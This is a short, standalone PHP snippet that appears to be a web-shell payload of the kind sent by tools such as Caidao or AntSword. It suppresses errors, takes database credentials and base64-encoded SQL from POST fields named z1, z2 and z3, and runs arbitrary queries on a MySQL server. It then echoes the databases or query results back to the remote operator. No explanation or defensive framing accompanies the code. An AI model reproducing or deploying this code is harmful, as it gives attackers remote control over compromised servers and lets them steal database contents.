@ini_set ( "display_errors", "0" );@set_time_limit ( 0 );;$m = get_magic_quotes_gpc ();$conf = $m ? stripslashes ( $_POST ["z1"] ) : $_POST ["z1"];$ar = explode("cldogcldogcldog", $conf);$dbn = $m ? stripslashes ( $_POST ["z2"] ) : $_POST ["z2"];$sql = base64_decode ( $_POST ["z3"] );$T = @mysqli_connect($ar[0],$ar[1],$ar[2]);@mysqli_query ($T, "SET NAMES utf8" );if($dbn==""){$sql = "SHOW DATABASES";$q = @mysqli_query ($T, $sql );$i = 0;while($rs=@mysqli_fetch_row($q)){echo(trim($rs[0]).chr(9))."\t\t\r\n";}@mysqli_close($T);die();}else{     @mysqli_select_db ($T, $dbn );$q = @mysqli_query ($T, $sql );$i = 0;$col =@mysqli_fetch_field_direct($q,0);echo $col->name."\t\t\r\n"; while ( $rs = @mysqli_fetch_row ( $q ) ) {echo trim($rs[0]);echo "\t\t";echo "\r\n";}@mysqli_close ( $T );die ();}